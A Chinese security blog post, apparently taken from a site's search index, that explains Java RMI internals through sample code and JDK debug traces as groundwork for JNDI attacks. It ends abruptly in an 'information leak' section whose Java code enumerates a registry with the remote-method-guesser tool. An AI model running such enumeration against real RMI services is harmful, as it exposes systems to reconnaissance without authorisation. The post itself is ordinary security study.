<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>最后一次再学JNDI</title>
      <link href="/2022/06/01/%E6%9C%80%E5%90%8E%E4%B8%80%E6%AC%A1%E5%86%8D%E8%B0%88JNDI/"/>
      <url>/2022/06/01/%E6%9C%80%E5%90%8E%E4%B8%80%E6%AC%A1%E5%86%8D%E8%B0%88JNDI/</url>
      
        <content type="html"><![CDATA[<h1 id="一文搞懂JNDI"><a href="#一文搞懂JNDI" class="headerlink" title="一文搞懂JNDI"></a>一文搞懂JNDI</h1><blockquote><p>之前一直学，一直忘，这次看到了大哥们的好文章，怒补一下</p></blockquote><h2 id="0x01-RMI"><a href="#0x01-RMI" class="headerlink" title="0x01 RMI"></a>0x01 RMI</h2><p><code>Remote Method Invocation</code> 远程方法调用，构建分布式应用程序，可以实现java跨<code>JVM</code>远程通信</p><ol><li><code>RMI客户端</code>在调用远程方法时会先创建<code>Stub(sun.rmi.registry.RegistryImpl_Stub)</code>。</li><li><code>Stub</code>会将<code>Remote</code>对象传递给<code>远程引用层(java.rmi.server.RemoteRef)</code>并创建<code>java.rmi.server.RemoteCall(远程调用)</code>对象。</li><li><code>RemoteCall</code>序列化<code>RMI服务名称</code>、<code>Remote</code>对象。</li><li><code>RMI客户端</code>的<code>远程引用层</code>传输<code>RemoteCall</code>序列化后的请求信息通过<code>Socket</code>连接的方式传输到<code>RMI服务端</code>的<code>远程引用层</code>。</li><li><code>RMI服务端</code>的<code>远程引用层(sun.rmi.server.UnicastServerRef)</code>收到请求会请求传递给<code>Skeleton(sun.rmi.registry.RegistryImpl_Skel#dispatch)</code>。</li><li><code>Skeleton</code>调用<code>RemoteCall</code>反序列化<code>RMI客户端</code>传过来的序列化。</li><li><code>Skeleton</code>处理客户端请求：<code>bind</code>、<code>list</code>、<code>lookup</code>、<code>rebind</code>、<code>unbind</code>，如果是<code>lookup</code>则查找<code>RMI服务名</code>绑定的接口对象，序列化该对象并通过<code>RemoteCall</code>传输到客户端。</li><li><code>RMI客户端</code>反序列化服务端结果，获取远程对象的引用。</li><li><code>RMI客户端</code>调用远程方法，<code>RMI服务端</code>反射调用<code>RMI服务实现类</code>的对应方法并序列化执行结果返回给客户端。</li><li><code>RMI客户端</code>反序列化<code>RMI</code>远程方法调用结果。</li></ol><p>他的出现就是为了可以实现远程代码调用。换句话说就是，我在客户端调用在服务端的代码，把参数传递给服务端，他返回结果给我。</p><blockquote><p>RMI原理分析： <a href="https://www.bilibili.com/video/BV1zP4y1s7Cj?p=2&amp;spm_id_from=pageDriver">https://www.bilibili.com/video/BV1zP4y1s7Cj?p=2&amp;spm_id_from=pageDriver</a></p><p><a href="https://blog.csdn.net/huxiang19851114/article/details/112991261">https://blog.csdn.net/huxiang19851114/article/details/112991261</a></p><p><a href="https://xz.aliyun.com/t/8644#toc-4">https://xz.aliyun.com/t/8644#toc-4</a></p><p>攻击rmi:<a href="https://github.com/qtc-de/remote-method-guesser">https://github.com/qtc-de/remote-method-guesser</a></p></blockquote><h3 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h3><blockquote><p>env: jdk8u181</p></blockquote><h4 id="server"><a href="#server" class="headerlink" title="server"></a>server</h4><p>有一点点类似于c语言的头文件和源文件，所以我们必须首先声明一个接口</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * RMI的接口 必须要 继承Remote</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ICalc</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现这个接口</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dem0.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">ICalc</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">baseNumber</span> <span class="operator">=</span> <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">Calc</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">sum</span> <span class="operator">=</span> baseNumber;</span><br><span class="line">        <span class="keyword">for</span> (Integer param : params) &#123;</span><br><span class="line">            sum += param;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Registry"><a href="#Registry" class="headerlink" title="Registry"></a>Registry</h4><p>开始注册。这里的注册有两种方法。一种是使用<code>LocateRegistry.createRegistry</code>来建立一个Registry，并且挂载在<code>calc</code>路径上，也可以使用静态方法<code>Naming.bind(&quot;url&quot;,class)</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RegCalc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, MalformedURLException &#123;</span><br><span class="line">        <span class="type">ICalc</span> <span class="variable">calc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Calc</span>();</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://127.0.0.1:9999&quot;</span>,calc);</span><br><span class="line"><span class="comment">//        Registry registry = LocateRegistry.createRegistry(9999);</span></span><br><span class="line"><span class="comment">//        registry.rebind(&quot;calc&quot;,calc);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="client"><a href="#client" class="headerlink" title="client"></a>client</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;192.168.59.1&quot;</span>, <span class="number">9999</span>);</span><br><span class="line"><span class="type">ICalc</span> <span class="variable">calc</span> <span class="operator">=</span> (ICalc) registry.lookup(<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><p>通过<code>getRegistry</code>获得<code>registry</code>对象，然后lookup拿到绑定在方法上的方法。</p><h4 id="发生了什么"><a href="#发生了什么" class="headerlink" title="发生了什么"></a>发生了什么</h4><p><img src="https://img.dem0dem0.top/images/image-20220429213739245.png" alt="image-20220429213739245"></p><p><img src="https://img.dem0dem0.top/images/image-20220429215535116.png" alt="image-20220429215535116"></p><p><img src="https://img.dem0dem0.top/images/image-20220429215545259.png" alt="image-20220429215545259"></p><p>按照上面图中的分析来讲，</p><h4 id="server-amp-register"><a href="#server-amp-register" class="headerlink" title="server &amp; register"></a>server &amp; register</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">9999</span>);</span><br><span class="line"><span class="comment">//        registry.rebind(&quot;calc&quot;,calc);</span></span><br></pre></td></tr></table></figure><p>这两句一个是register的，一个server的代码。但是一般来说这二者都在一个服务器上面所以就不再展开分析了。我们首先来debug一下。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new Calc();</span><br></pre></td></tr></table></figure><p><img src="https://img.dem0dem0.top/images/image-20220430164810885.png" alt="image-20220430164810885"></p><p>他的<code>ref</code>属性是UnicastServerRef(RemoteRef).然后调用他的exportObject方法.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote var1, Object var2, <span class="type">boolean</span> var3)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var4</span> <span class="operator">=</span> var1.getClass();</span><br><span class="line">        Remote var5;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//根据class对象生成代理对象，用来服务于客户端RegistryImpl的Stub对象,这里是Calc的代理对象，后面也是一样的</span></span><br><span class="line">            var5 = Util.createProxy(var4, <span class="built_in">this</span>.getClientRef(), <span class="built_in">this</span>.forceStubUse);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(<span class="string">&quot;remote object implements illegal remote interface&quot;</span>, var7);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (var5 <span class="keyword">instanceof</span> RemoteStub) &#123;</span><br><span class="line">            <span class="built_in">this</span>.setSkeleton(var1);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//封装proxy</span></span><br><span class="line">        <span class="type">Target</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Target</span>(var1, <span class="built_in">this</span>, var5, <span class="built_in">this</span>.ref.getObjID(), var3);</span><br><span class="line">    <span class="comment">//发布proxy</span></span><br><span class="line">        <span class="built_in">this</span>.ref.exportObject(var6);</span><br><span class="line">        <span class="built_in">this</span>.hashToMethod_Map = (Map)hashToMethod_Maps.get(var4);</span><br><span class="line">        <span class="keyword">return</span> var5;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>UnicastServerRef</code>最顶层的也是<code>Remote</code>,<code>LiveRef</code>是对于socket交流的封装。</p><p>因为我们在实现接口的时候，继承了<code>UnicastRemoteObject</code>,所以我们在new的时候会调用父类的构造方法</p><p><img src="https://img.dem0dem0.top/images/image-20220430090358259.png" alt="image-20220430090358259"></p><p>会自动地帮忙<code>exportObject</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Creates and exports a new UnicastRemoteObject object using the particular supplied port.</span><br></pre></td></tr></table></figure><p>所以会随机用一个port导出这个类(会生成objectiD(唯一))。现在我们才能说这个远程类可以被导出了。也就完成了这一步。</p><p><img src="https://img.dem0dem0.top/images/image-20220430090625044.png" alt="image-20220430090625044"></p><p>接下来就是注册中心create了，这部分不多说。然后就是<code>bind</code>了，实现的方式也很简单，<code>this.bindings(private Hashtable&lt;String, Remote&gt;)</code>.</p><p><img src="https://img.dem0dem0.top/images/image-20220430091000720.png" alt="image-20220430091000720"></p><p>确实就是接口名字，endpoint和objid。现在服务端和register都准备好了，开始看client端了。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">9999</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">RegistryImpl</span><span class="params">(<span class="keyword">final</span> <span class="type">int</span> var1)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="built_in">this</span>.bindings = <span class="keyword">new</span> <span class="title class_">Hashtable</span>(<span class="number">101</span>);</span><br><span class="line">    <span class="keyword">if</span> (var1 == <span class="number">1099</span> &amp;&amp; System.getSecurityManager() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedExceptionAction</span>&lt;Void&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">                    <span class="type">LiveRef</span> <span class="variable">var1x</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(RegistryImpl.id, var1);</span><br><span class="line">                    RegistryImpl.<span class="built_in">this</span>.setup(<span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(var1x, (var0) -&gt; &#123;</span><br><span class="line">                        <span class="keyword">return</span> RegistryImpl.registryFilter(var0);</span><br><span class="line">                    &#125;));</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, (AccessControlContext)<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">SocketPermission</span>(<span class="string">&quot;localhost:&quot;</span> + var1, <span class="string">&quot;listen,accept&quot;</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (PrivilegedActionException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (RemoteException)var3.getException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">LiveRef</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, var1);</span><br><span class="line">        <span class="built_in">this</span>.setup(<span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(var2, RegistryImpl::registryFilter));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键代码<code>this.setup(new UnicastServerRef(var2, RegistryImpl::registryFilter));</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">setup</span><span class="params">(UnicastServerRef var1)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="comment">//将指向正在初始化的RegistryImpl对象的远程引用ref（RemoteRef）赋值为传入的UnicastServerRef对象，这里涉及了向上转型（后续会用到LiveRef）</span></span><br><span class="line">        <span class="built_in">this</span>.ref = var1;</span><br><span class="line">    <span class="comment">//然后又会调用到上面的exportObject</span></span><br><span class="line">    <span class="comment">// this 获取RegistryImpl的class对象--Skeleton类型</span></span><br><span class="line">        var1.exportObject(<span class="built_in">this</span>, (Object)<span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>到现在来说，我们进行的还只是一些变量赋值的操作，都没有进行传输层上的业务，但是追溯<code>LiveRef(传输层的封装)</code>的exportObject()方法，很容易找到了TCPTransport的exportObject()方法。这个方法做的事情就是将上面构造的Target对象暴露出去。调用TCPTransport的listen()方法，listen()方法创建了一个ServerSocket，并且启动了一条线程等待客户端的请求。接着调用父类Transport的exportObject()将Target对象存放进ObjectTable中。</p><h4 id="client-1"><a href="#client-1" class="headerlink" title="client"></a>client</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;192.168.59.1&quot;</span>, <span class="number">9999</span>);</span><br></pre></td></tr></table></figure><p>追踪下去</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">LiveRef</span> <span class="variable">liveRef</span> <span class="operator">=</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">LiveRef</span>(<span class="keyword">new</span> <span class="title class_">ObjID</span>(ObjID.REGISTRY_ID),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port, csf, <span class="literal">null</span>),</span><br><span class="line">                        <span class="literal">false</span>);</span><br><span class="line">        <span class="type">RemoteRef</span> <span class="variable">ref</span> <span class="operator">=</span></span><br><span class="line">            (csf == <span class="literal">null</span>) ? <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(liveRef) : <span class="keyword">new</span> <span class="title class_">UnicastRef2</span>(liveRef);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (Registry) Util.createProxy(RegistryImpl.class, ref, <span class="literal">false</span>);<span class="comment">//客户端有了服务端的RegistryImpl的代理</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ICalc calc = (ICalc) registry.lookup(&quot;calc&quot;);</span><br></pre></td></tr></table></figure><p>调用<code>registerimpl#lookup</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Remote <span class="title function_">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> AccessException, NotBoundException, RemoteException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//newCall()方法做的事情简单来看就是建立了跟远程RegistryImpl的Skeleton对象的连接</span></span><br><span class="line">            <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">this</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">                var3.writeObject(var1);</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="comment">//ref UnicastRef（子类;UnicastServerRef） ===&gt; 使用socket发送</span></span><br><span class="line">            <span class="built_in">this</span>.ref.invoke(var2);</span><br><span class="line">            Remote var22;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectInput</span> <span class="variable">var4</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">                var22 = (Remote)var4.readObject();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var14) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, var14);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException var15) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, var15);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.ref.done(var2);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们删除了所有catch的异常。然后我们追踪到invoke中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public void invoke(RemoteCall var1) throws Exception &#123;</span><br><span class="line">       try &#123;</span><br><span class="line">           clientRefLog.log(Log.VERBOSE, &quot;execute call&quot;);</span><br><span class="line">           var1.executeCall();</span><br></pre></td></tr></table></figure><p><code>StreamRemoteCall#</code>executeCall</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">executeCall</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">DGCAckHandler</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">byte</span> var1;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.out != <span class="literal">null</span>) &#123;</span><br><span class="line">            var2 = <span class="built_in">this</span>.out.getDGCAckHandler();<span class="comment">//这里有一个新协议DGC</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.releaseOutputStream();</span><br><span class="line">        <span class="type">DataInputStream</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="built_in">this</span>.conn.getInputStream());</span><br><span class="line">        <span class="type">byte</span> <span class="variable">var4</span> <span class="operator">=</span> var3.readByte();</span><br><span class="line">        <span class="keyword">if</span> (var4 != <span class="number">81</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Transport.transportLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">                Transport.transportLog.log(Log.BRIEF, <span class="string">&quot;transport return code invalid: &quot;</span> + var4);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;Transport return code invalid&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.getInputStream();</span><br><span class="line">        var1 = <span class="built_in">this</span>.in.readByte();</span><br><span class="line">        <span class="built_in">this</span>.in.readID();</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">switch</span>(var1) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        Object var14;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var14 = <span class="built_in">this</span>.in.readObject();</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">if</span> (!(var14 <span class="keyword">instanceof</span> Exception)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;Return type not Exception&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.exceptionReceivedFromServer((Exception)var14);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">if</span> (Transport.transportLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">            Transport.transportLog.log(Log.BRIEF, <span class="string">&quot;return code invalid: &quot;</span> + var1);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;Return code invalid&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到此为止，用户端的请求构造也告一段落了。下面就是服务端的处理了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">target.run();下断点</span><br></pre></td></tr></table></figure><p>然后一步一步跟踪</p><p><img src="https://img.dem0dem0.top/images/image-20220430172920205.png" alt="image-20220430172920205"></p><p>一步一步我们找到了Transport的serviceCall()方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">serviceCall</span><span class="params">(<span class="keyword">final</span> RemoteCall var1)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ObjID var39;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var39 = ObjID.read(var1.getInputStream());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var33) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;unable to read objID&quot;</span>, var33);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Transport</span> <span class="variable">var40</span> <span class="operator">=</span> var39.equals(dgcID) ? <span class="literal">null</span> : <span class="built_in">this</span>;</span><br><span class="line">        <span class="comment">//获取目标对象，5.2.1启动服务的时候put进去的</span></span><br><span class="line">       <span class="comment">// 还记得我们在bindings中存放的其实是OperationImpl的真正实现，并非是Stub对象。</span></span><br><span class="line">        <span class="type">Target</span> <span class="variable">var5</span> <span class="operator">=</span> ObjectTable.getTarget(<span class="keyword">new</span> <span class="title class_">ObjectEndpoint</span>(var39, var40));</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="keyword">final</span> Remote var37;</span><br><span class="line">        <span class="keyword">if</span> (var5 != <span class="literal">null</span> &amp;&amp; (var37 = var5.getImpl()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Dispatcher</span> <span class="variable">var6</span> <span class="operator">=</span> var5.getDispatcher();</span><br><span class="line">            var5.incrementCallCount();</span><br><span class="line">            <span class="type">boolean</span> var8;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                transportLog.log(Log.VERBOSE, <span class="string">&quot;call dispatcher&quot;</span>);</span><br><span class="line">                <span class="keyword">final</span> <span class="type">AccessControlContext</span> <span class="variable">var7</span> <span class="operator">=</span> var5.getAccessControlContext();</span><br><span class="line">                <span class="type">ClassLoader</span> <span class="variable">var41</span> <span class="operator">=</span> var5.getContextClassLoader();</span><br><span class="line">                <span class="type">ClassLoader</span> <span class="variable">var9</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    setContextClassLoader(var41);</span><br><span class="line">                    currentTransport.set(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedExceptionAction</span>&lt;Void&gt;() &#123;</span><br><span class="line">                            <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                                Transport.<span class="built_in">this</span>.checkAcceptPermission(var7);</span><br><span class="line">                                var6.dispatch(var37, var1);</span><br><span class="line">                                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;, var7);</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (PrivilegedActionException var31) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> (IOException)var31.getException();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    setContextClassLoader(var9);</span><br><span class="line">                    currentTransport.set((Object)<span class="literal">null</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var34) &#123;</span><br><span class="line">                transportLog.log(Log.BRIEF, <span class="string">&quot;exception thrown by dispatcher: &quot;</span>, var34);</span><br><span class="line">                var8 = <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                var5.decrementCallCount();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> var8;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchObjectException</span>(<span class="string">&quot;no such object in table&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回了一个proxy对象。然后利用<code>RemoteObjectInvocationHandler</code>invoke来调用方法。下面这两个是我还没有debug到的，但是我们看到了在整个的处理过程中，存在许多的readobject()。</p><ul><li>服务端通过<code>sun.rmi.transport.tcp.TCPTransport#handleMessages</code>中的循环来监听输入流</li><li>对应的，服务端远程对象使用<code>sun.rmi.UnicastServerRef</code>来处理远端对本服务对象的调用。</li></ul><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>略~~~~</p><h3 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h3><blockquote><p>参考: <a href="https://github.com/qtc-de/remote-method-guesser">https://github.com/qtc-de/remote-method-guesser</a></p></blockquote><h4 id="1-信息泄露"><a href="#1-信息泄露" class="headerlink" title="1. 信息泄露"></a>1. 信息泄露</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dem0.vuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.dem0.internal.ReflectUtils;</span><br><span class="line"><span class="keyword">import</span> de.qtc.rmg.networking.RMIRegistryEndpoint;</span><br><span class="line"><span class="keyword">import</span> de.qtc.rmg.plugin.PluginSystem;</span><br><span class="line"><span class="keyword">import</span> de.qtc.rmg.utils.RemoteObjectWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">infoLeak</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;192.168.59.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line"><span class="comment">//            System.out.println(registry.list());</span></span><br><span class="line">            ReflectUtils.enableCustomRMIClassLoader();</span><br><span class="line">            PluginSystem.init(<span class="literal">null</span>);</span><br><span class="line">            <span class="type">RMIRegistryEndpoint</span> <span class="variable">rmiRegistry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIRegistryEndpoint</span>(<span class="string">&quot;192.168.59.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line"><span 